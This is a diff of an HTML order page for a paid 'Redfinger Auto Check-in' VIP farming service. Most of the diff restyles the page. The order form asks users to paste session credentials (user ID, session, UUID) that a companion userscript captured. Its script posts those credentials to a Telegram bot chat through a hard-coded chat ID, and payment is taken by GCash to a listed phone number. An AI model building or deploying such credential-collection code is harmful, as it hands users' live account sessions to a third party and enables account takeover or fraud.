@@ -3,82 +3,212 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Redfinger Auto Check-in</title>
+  <title>Redfinger Auto Check-in • Premium VIP Farming</title>
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.6.0/css/all.min.css">
   <style>
-    body { font-family: 'Inter', system-ui, sans-serif; background: linear-gradient(135deg, #0a1428 0%, #1e3a8a 100%); color: #e0f2fe; min-height: 100vh; padding: 20px; }
-    .container { max-width: 1000px; margin: 40px auto; background: rgba(15, 23, 42, 0.98); border-radius: 20px; overflow: hidden; box-shadow: 0 0 40px rgba(59, 130, 246, 0.6); border: 1px solid #60a5fa; }
-    .header { background: linear-gradient(90deg, #1e40af, #3b82f6); padding: 40px 20px; text-align: center; color: white; }
-    .header h1 { font-size: 2.6rem; margin: 0; }
-    .content { padding: 40px 30px; }
-    input, textarea, select { width: 100%; padding: 16px; margin: 12px 0; background: #334155; border: none; border-radius: 12px; color: white; font-size: 1.1rem; }
-    textarea { height: 140px; resize: vertical; font-family: monospace; }
-    button { width: 100%; padding: 18px; background: linear-gradient(90deg, #3b82f6, #60a5fa); color: white; border: none; border-radius: 12px; font-size: 1.3rem; font-weight: 600; cursor: pointer; margin: 15px 0; transition: all 0.3s; }
-    button:hover { transform: translateY(-3px); }
-    .step { background:#1e2937; padding:25px; border-radius:16px; margin:20px 0; }
-    .price-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(280px, 1fr)); gap: 20px; margin: 25px 0; }
-    .price-card { background: #1e2937; border-radius: 16px; padding: 20px; text-align: center; border: 2px solid #60a5fa; }
-    .price-card h3 { margin: 0 0 15px 0; font-size: 1.4rem; }
-    .qr-container { text-align: center; background: white; padding: 15px; border-radius: 12px; width: fit-content; margin: 20px auto; }
-    .success { background:#22c55e; color:black; padding:25px; border-radius:12px; text-align:center; }
+    @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=Space+Grotesk:wght@500;600;700&display=swap');
+
+    body {
+      font-family: 'Inter', system-ui, sans-serif;
+      background: linear-gradient(135deg, #0a0f1c 0%, #1e2a5e 100%);
+      color: #e0f2fe;
+      min-height: 100vh;
+      padding: 20px;
+      background-attachment: fixed;
+    }
+    .container {
+      max-width: 1100px;
+      margin: 30px auto;
+      background: rgba(15, 23, 42, 0.95);
+      border-radius: 24px;
+      overflow: hidden;
+      box-shadow: 0 0 60px rgba(59, 130, 246, 0.5);
+      border: 1px solid rgba(96, 165, 250, 0.3);
+      backdrop-filter: blur(12px);
+    }
+    .header {
+      background: linear-gradient(90deg, #1e3a8a, #3b82f6, #60a5fa);
+      padding: 60px 20px 50px;
+      text-align: center;
+      position: relative;
+      overflow: hidden;
+    }
+    .header::before {
+      content: '';
+      position: absolute;
+      top: -50%;
+      left: -50%;
+      width: 200%;
+      height: 200%;
+      background: radial-gradient(circle, rgba(255,255,255,0.15) 0%, transparent 70%);
+      animation: glow 15s infinite alternate;
+    }
+    @keyframes glow { 0% { transform: rotate(0deg); } 100% { transform: rotate(5deg); } }
+
+    .header h1 {
+      font-family: 'Space Grotesk', sans-serif;
+      font-size: 3.2rem;
+      margin: 0 0 10px 0;
+      text-shadow: 0 0 30px rgba(147, 197, 253, 0.8);
+    }
+    .content { padding: 50px 40px; }
+
+    .step {
+      background: rgba(30, 41, 59, 0.8);
+      padding: 30px;
+      border-radius: 20px;
+      margin: 25px 0;
+      border: 1px solid rgba(96, 165, 250, 0.2);
+      transition: all 0.4s;
+    }
+    .step:hover { transform: translateY(-5px); border-color: #60a5fa; }
+
+    input, textarea, select {
+      width: 100%;
+      padding: 16px 20px;
+      margin: 12px 0;
+      background: rgba(51, 65, 85, 0.9);
+      border: 1px solid rgba(148, 163, 184, 0.3);
+      border-radius: 14px;
+      color: white;
+      font-size: 1.1rem;
+    }
+    textarea { height: 160px; font-family: monospace; resize: vertical; }
+
+    button {
+      width: 100%;
+      padding: 20px;
+      background: linear-gradient(90deg, #22c55e, #86efac);
+      color: black;
+      border: none;
+      border-radius: 16px;
+      font-size: 1.4rem;
+      font-weight: 700;
+      cursor: pointer;
+      margin: 20px 0;
+      transition: all 0.4s;
+      box-shadow: 0 10px 30px rgba(74, 222, 128, 0.4);
+    }
+    button:hover {
+      transform: translateY(-4px) scale(1.02);
+      box-shadow: 0 15px 40px rgba(74, 222, 128, 0.6);
+    }
+
+    .price-grid {
+      display: grid;
+      grid-template-columns: repeat(auto-fit, minmax(260px, 1fr));
+      gap: 20px;
+      margin: 30px 0;
+    }
+    .price-card {
+      background: linear-gradient(145deg, #1e2937, #334155);
+      border-radius: 20px;
+      padding: 25px;
+      text-align: center;
+      border: 2px solid transparent;
+      transition: all 0.4s;
+    }
+    .price-card:hover {
+      border-color: #60a5fa;
+      transform: translateY(-10px);
+    }
+    .price-card.best {
+      border-color: #eab308;
+      box-shadow: 0 0 30px rgba(234, 179, 8, 0.4);
+    }
+
+    .qr-container {
+      text-align: center;
+      background: white;
+      padding: 20px;
+      border-radius: 16px;
+      width: fit-content;
+      margin: 25px auto;
+      box-shadow: 0 10px 30px rgba(0,0,0,0.3);
+    }
+
+    .success {
+      background: linear-gradient(90deg, #22c55e, #4ade80);
+      color: black;
+      padding: 30px;
+      border-radius: 16px;
+      text-align: center;
+      font-size: 1.2rem;
+    }
   </style>
 </head>
 <body>
   <div class="container">
     <div class="header">
-      <h1>🚀 REDFINGER AUTO CHECK-IN</h1>
-      <p>Automated VIP Farming Service • Fast & Reliable</p>
+      <h1>🚀 REDFINGER AUTO</h1>
+      <p style="font-size:1.3rem; margin:10px 0 0;">Premium VIP Farming Service • 24/7 Automated</p>
     </div>
+
     <div class="content">
 
-      <h2 style="text-align:center; margin:30px 0;">📋 Step 1: Paste Your Captured Info</h2>
+      <!-- Paste Credentials -->
       <div class="step">
-        <textarea id="credentials" placeholder="Paste the full text from the userscript here (User ID, Session, UUID...)"></textarea>
+        <h2 style="text-align:center; margin-bottom:20px;">📋 Step 1: Paste Captured Info</h2>
+        <textarea id="credentials" placeholder="Paste everything from the Redfinger Capture button here..."></textarea>
       </div>
 
-      <h2 style="text-align:center; margin:40px 0 20px;">💎 Choose Your Plan</h2>
+      <!-- Price List -->
+      <h2 style="text-align:center; margin:40px 0 25px;">💎 Choose Your VIP Plan</h2>
       <div class="price-grid">
         <div class="price-card">
           <h3>VIP</h3>
-          <p>7 Days — ₱50<br>30 Days — ₱180<br>90 Days — ₱500</p>
+          <p><strong>7 Days</strong> — ₱50<br>
+             <strong>30 Days</strong> — ₱180 <span style="color:#eab308;">★ Best</span><br>
+             <strong>90 Days</strong> — ₱500</p>
         </div>
         <div class="price-card">
           <h3>KVIP</h3>
-          <p>7 Days — ₱120<br>30 Days — ₱360<br>90 Days — ₱1000</p>
+          <p><strong>7 Days</strong> — ₱120<br>
+             <strong>30 Days</strong> — ₱360 <span style="color:#eab308;">★ Best</span><br>
+             <strong>90 Days</strong> — ₱1,000</p>
         </div>
-        <div class="price-card">
+        <div class="price-card best">
           <h3>SVIP</h3>
-          <p>7 Days — ₱135<br>30 Days — ₱390<br>90 Days — ₱1,100</p>
+          <p><strong>7 Days</strong> — ₱135<br>
+             <strong>30 Days</strong> — ₱390 <span style="color:#eab308;">★ Best</span><br>
+             <strong>90 Days</strong> — ₱1,100</p>
         </div>
         <div class="price-card">
           <h3>XVIP</h3>
-          <p>7 Days — ₱315<br>30 Days — ₱1,050</p>
+          <p><strong>7 Days</strong> — ₱315<br>
+             <strong>30 Days</strong> — ₱1,050 <span style="color:#eab308;">★ Best</span></p>
         </div>
       </div>
 
+      <!-- Order Form -->
       <div class="step">
-        <h3>🛒 Place Your Order</h3>
-        <input type="text" id="customer" placeholder="Your Name / Telegram @" value="dazai">
+        <h2 style="text-align:center; margin-bottom:25px;">🛒 Step 2: Place Order</h2>
+        <input type="text" id="customer" placeholder="Your Name / Telegram Username" value="dazai">
         <select id="vip">
           <option value="VIP">VIP</option>
           <option value="KVIP">KVIP</option>
-          <option value="SVIP" selected>SVIP</option>
+          <option value="SVIP" selected>SVIP (Recommended)</option>
           <option value="XVIP">XVIP</option>
         </select>
         <input type="number" id="days" placeholder="Number of Days" value="30" min="7">
         <textarea id="note" placeholder="Additional notes (optional)"></textarea>
-        <button onclick="submitOrder()">🚀 SUBMIT ORDER & PAY</button>
+        <button onclick="submitOrder()">🚀 CONFIRM ORDER & PROCEED TO PAYMENT</button>
       </div>
 
-      <h2 style="text-align:center; margin:40px 0 20px;">💰 Payment (GCash)</h2>
-      <div class="step" style="text-align:center;">
-        <p><strong>Scan QR Code to Pay</strong></p>
+      <!-- Payment Section -->
+      <div class="step">
+        <h2 style="text-align:center;">💰 Step 3: Payment via GCash</h2>
+        <p style="text-align:center; font-size:1.1rem;">Scan QR or Transfer Manually</p>
+        
         <div class="qr-container">
-          <img src="https://i.imgur.com/your-qr-link.jpg" alt="GCash QR" width="280" id="qr-image">
+          <img src="https://i.imgur.com/SnIB5Dt.jpeg" alt="GCash QR Code" width="300" id="qr-image">
         </div>
-        <p><strong>Or Manual Transfer:</strong><br>
-        <b>0994 6461 806</b> (E.R)<br>
-        <small>Send exact amount + your name in reference</small></p>
+
+        <div style="text-align:center; margin-top:20px;">
+          <strong style="font-size:1.3rem;">Manual Transfer:</strong><br>
+          <span style="font-size:1.5rem; color:#86efac;">0994 6461 806</span> <small>(E.R)</small><br>
+          <small>Send exact amount + your Telegram name in the reference</small>
+        </div>
       </div>
 
       <div id="result"></div>
@@ -90,14 +220,13 @@
     const CHAT_ID = "6598357465";
 
     async function sendToTelegram(message) {
-      const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
       try {
-        await fetch(url, {
+        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
           body: JSON.stringify({ chat_id: CHAT_ID, text: message, parse_mode: 'HTML' })
         });
-      } catch (e) { console.error(e); }
+      } catch (e) {}
     }
 
     async function submitOrder() {
@@ -110,35 +239,33 @@
       const credentials = document.getElementById('credentials').value.trim();
       const note = document.getElementById('note').value.trim();
 
-      if (!days || !credentials) {
-        alert("Please paste your credentials and enter number of days!");
+      if (!days || !credentials || credentials.length < 20) {
+        alert("❌ Please paste your Redfinger credentials and select days!");
         return;
       }
 
       btn.disabled = true;
-      btn.innerHTML = '⏳ Sending Order...';
+      btn.innerHTML = '⏳ Processing Your Order...';
 
-      const message = `🛒 <b>New Redfinger Order</b>\n\n` +
-                      `👤 Customer: <b>${customer}</b>\n` +
+      const message = `🛒 <b>New Premium Order</b>\n\n` +
+                      `👤 <b>${customer}</b>\n` +
                       `⭐ Plan: <b>${vip}</b> — ${days} Days\n` +
-                      `💰 Amount: To be calculated\n\n` +
-                      `📋 <b>Credentials:</b>\n` +
-                      `<pre>${credentials}</pre>\n\n` +
+                      `📋 <b>Credentials:</b>\n<pre>${credentials}</pre>\n\n` +
                       `${note ? `📝 Note: ${note}\n\n` : ''}` +
-                      `⏰ Time: ${new Date().toLocaleString()}`;
+                      `⏰ ${new Date().toLocaleString()}`;
 
       await sendToTelegram(message);
 
       resultDiv.innerHTML = `
         <div class="success">
-          ✅ <strong>Order Received Successfully!</strong><br><br>
-          <b>${customer}</b> — ${days} days of <b>${vip}</b><br><br>
-          Please complete payment via GCash QR or manual transfer.<br>
-          <small>I will activate your account after payment confirmation.</small>
+          ✅ <strong>Order Successfully Received!</strong><br><br>
+          Thank you, <b>${customer}</b>!<br>
+          Please complete GCash payment now.<br><br>
+          <small>I will activate your ${vip} account within minutes after payment confirmation.</small>
         </div>`;
 
       btn.disabled = false;
-      btn.innerHTML = '✅ ORDER SUBMITTED';
+      btn.innerHTML = '✅ ORDER PLACED SUCCESSFULLY';
     }
   </script>
 </body>
